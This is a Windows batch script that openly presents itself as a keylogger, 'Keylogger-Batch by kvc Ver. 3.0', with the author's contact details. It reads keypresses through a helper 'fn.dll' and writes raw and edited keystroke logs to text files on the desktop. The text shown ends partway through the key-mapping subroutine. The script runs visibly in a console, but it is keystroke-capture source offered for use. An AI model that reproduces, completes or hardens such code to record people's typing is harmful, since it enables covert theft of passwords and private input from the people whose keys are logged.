# mio-key-prov
@echo off
 cls
 CD Files
 mode 85,25
 :: This keylogger is able to log all keys pressed...[A-Z and a-z and 0-9]
 :: and it can almost log all Characters on your Keyboard...including all special keys ...as to Remove limitation of Previous Versions of this program ...
 :: #kvc

 REM As in ver. 1.0 ,we used 'choice.exe or choice.com' for logging Pressed keys on Keyboard ...
 rem and we've used 'mChoice.exe' (written in C) for ver.2.0
 REM same reason for using 'fn.dll' file in this version...i.e. to fulfill our requirment !!


 :: for any info. contact me 'karanveerchouhan@gmail.com' or 'karanveerchouhan.kvc@facebook.com'
 :: Or
 :: you can Leave a comment on my blog too...
 :: visit my Blog 'batchprogrammers.blogspot.in'


 title Keylogger-Batch by kvc Ver. 3.0
 setlocal enabledelayedexpansion
 REm Checking if our fn.dll file is present or not ...
 REM if not exist "fn.dll" (echo. The fn.dll file is not found ...&echo.Please make sure that Both Files are in the Same Folder as you Downloaded them !! && goto end)
 set var=
 if exist "%userprofile%\desktop\keylogger_original.txt" del /q "%userprofile%\desktop\keylogger_original.txt" >nul 2>&1
 if exist "%userprofile%\desktop\keylogger_Modified.txt" del /q "%userprofile%\desktop\keylogger_Modified.txt" >nul 2>&1
 :a
 cls
 if exist "%userprofile%\desktop\keylogger_Modified.txt" (set /p var1=<"%userprofile%\desktop\keylogger_Modified.txt") ELSE set var1=
 set result=
 echo. !var!
 echo. !var1!
 echo.
 echo. Keylogger by Kvc
 echo.&echo.Check the log file of All possible pressed Keys in "Desktop\keylogger_original.txt"
 echo.&echo.Check the log file of intentional pressed Keys in "Desktop\keylogger_Modified.txt"
 echo.
 fn.dll kbd
 call :chk_keyPressed "%errorlevel%" Result
 set var=!var!!result!
 echo.!var!>"%userprofile%\desktop\keylogger_original.txt"
 call :manuplate_it "%result%"
 goto a

 :manuplate_it
 if exist "%userprofile%\desktop\keylogger_Modified.txt" (set /p var1=<"%userprofile%\desktop\keylogger_Modified.txt") ELSE set var1=
 if /i "%~1" == "{BS}" (
 call :getlen "!var1!" size
 if "!size!" leq "1" (Del /q "%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
 ECHO.%var1:~0,-1%>"%userprofile%\desktop\keylogger_Modified.txt"
 goto :eof
 )
 if /i "%~1" == "{TAB}" (ECHO.%var1% >"%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
 if /i "%~1" == "{Enter}" (ECHO.>>"%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
 if /i "%~1" == "{Space}" (ECHO.%var1% >"%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
 set "temp=%~1"
 if /i "!temp:~0,1!" == "{" (goto :eof)
 set var1=!var1!%temp%
 echo.%var1%>"%userprofile%\desktop\keylogger_Modified.txt"
 goto :eof

 :chk_keyPressed
 REM Checking if any Special key is Pressed or Not ...
 if /i "%~1" == "0" set "%~2={NULL}"
 if /i "%~1" == "1" set "%~2={Alt+1}"
 if /i "%~1" == "2" set "%~2={Alt+2}"
 if /i "%~1" == "3" set "%~2={Alt+3}"
